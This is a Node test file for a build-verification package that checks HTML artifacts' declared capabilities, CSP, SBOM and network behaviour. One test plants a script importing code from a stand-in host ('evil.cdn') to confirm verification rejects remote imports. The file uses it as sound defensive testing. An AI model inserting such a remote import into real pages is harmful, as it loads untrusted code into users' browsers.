// @gcu/seal — emit + verify. The point of the package is that a false declaration
// FAILS the build, so the tests plant violations and assert verify throws.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { emitArtifacts, verifyClaims, SealError, sha256, extractCsp, buildSbom, profileOf } from '../ext/seal/index.js';

const SEALED_TEMPLATE = {
  tool: 'demo', profile: 'Sealed', flags: [], version: '0.1.0',
  executes: { runtime_codegen: false, wasm: false, remote_import: false },
  reach: { network: 'none' }, host_needs: { secure_origin: true }, license: 'MIT',
};
const CLEAN_HTML = `<!doctype html><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; connect-src 'none'"><body><script>const x=1+1;</script>`;

test('sha256 is deterministic + 64 hex', () => {
  const h = sha256(Buffer.from('hello'));
  assert.match(h, /^[0-9a-f]{64}$/);
  assert.equal(h, sha256('hello'));
});

test('extractCsp pulls the meta CSP', () => {
  assert.equal(extractCsp(CLEAN_HTML), "default-src 'none'; script-src 'self'; connect-src 'none'");
  assert.equal(extractCsp('<html>no csp</html>'), null);
});

test('emitArtifacts fills version + sha256 + the real csp', () => {
  const { capability, sha256: h, csp, sbom, cspText } = emitArtifacts({ bytes: CLEAN_HTML, template: SEALED_TEMPLATE, version: '1.2.3' });
  assert.equal(capability.version, '1.2.3');
  assert.equal(capability.sha256, h);
  assert.equal(capability.host_needs.csp, csp);                 // csp from the file, not the template
  assert.match(csp, /connect-src 'none'/);
  assert.equal(sbom.bomFormat, 'CycloneDX');
  assert.match(cspText, /connect-src 'none';/);
});

test('SBOM lists deps as components', () => {
  const s = buildSbom({ name: 'demo', version: '1', deps: [{ name: 'fflate', version: '0.8.0', license: 'MIT' }] });
  assert.equal(s.components.length, 1);
  assert.equal(s.components[0].name, 'fflate');
  assert.equal(s.components[0].licenses[0].license.id, 'MIT');
});

test('verify passes a clean Sealed artifact with a clean runtime smoke', async () => {
  const { capability } = emitArtifacts({ bytes: CLEAN_HTML, template: SEALED_TEMPLATE });
  const report = await verifyClaims({ bytes: CLEAN_HTML, capability, runSmoke: async () => ({ networkRequests: 0, ranClean: true }) });
  assert.equal(report.ok, true);
  assert.equal(report.profile, 'Sealed');
});

test('verify FAILS on a literal remote import (Sealed forbids)', async () => {
  const html = CLEAN_HTML + `<script>import("https://evil.cdn/x.js")</script>`;
  const { capability } = emitArtifacts({ bytes: html, template: SEALED_TEMPLATE });
  await assert.rejects(
    () => verifyClaims({ bytes: html, capability, runSmoke: async () => ({ networkRequests: 0, ranClean: true }) }),
    (e) => e instanceof SealError && e.report.checks.some((c) => c.name === 'no-remote-import' && !c.pass),
  );
});

test('verify FAILS when the runtime smoke records network (Sealed)', async () => {
  const { capability } = emitArtifacts({ bytes: CLEAN_HTML, template: SEALED_TEMPLATE });
  await assert.rejects(
    () => verifyClaims({ bytes: CLEAN_HTML, capability, runSmoke: async () => ({ networkRequests: 3, ranClean: true }) }),
    (e) => e instanceof SealError && e.report.checks.some((c) => c.name === 'zero-network (runtime)' && !c.pass),
  );
});

test('verify reports network UNVERIFIED (not passed) when no runSmoke given', async () => {
  const { capability } = emitArtifacts({ bytes: CLEAN_HTML, template: SEALED_TEMPLATE });
  const report = await verifyClaims({ bytes: CLEAN_HTML, capability });   // no smoke
  const c = report.checks.find((x) => x.name === 'runtime-smoke');
  assert.ok(c && !c.pass && !c.gate);                            // surfaced as unverified, doesn't fail the build
});

test('codegen source scan WARNS but does not gate (runtime is authoritative)', async () => {
  const html = CLEAN_HTML + `<script>/* the word eval( in a comment */</script>`;
  const { capability } = emitArtifacts({ bytes: html, template: SEALED_TEMPLATE });
  const report = await verifyClaims({ bytes: html, capability, runSmoke: async () => ({ networkRequests: 0, ranClean: true }) });
  assert.equal(report.ok, true);                                 // didn't fail on the fuzzy match
  const c = report.checks.find((x) => x.name === 'no-codegen (source scan)');
  assert.ok(c && !c.pass && !c.gate);                            // but it IS reported
});

test('Connected gates on-load network, not total egress', async () => {
  const tmpl = { ...SEALED_TEMPLATE, profile: 'Connected', reach: { network: 'opt-in' } };
  const { capability } = emitArtifacts({ bytes: CLEAN_HTML, template: tmpl });
  const ok = await verifyClaims({ bytes: CLEAN_HTML, capability, runSmoke: async () => ({ networkRequestsOnLoad: 0, networkRequests: 5, ranClean: true }) });
  assert.equal(ok.ok, true);                                     // 5 user-invoked requests fine; 0 on load
  await assert.rejects(() => verifyClaims({ bytes: CLEAN_HTML, capability, runSmoke: async () => ({ networkRequestsOnLoad: 2, ranClean: true }) }));
});

test('profileOf rejects an unknown profile', () => {
  assert.throws(() => profileOf('Nope'));
  assert.equal(profileOf('Sealed').network, 'none');
});
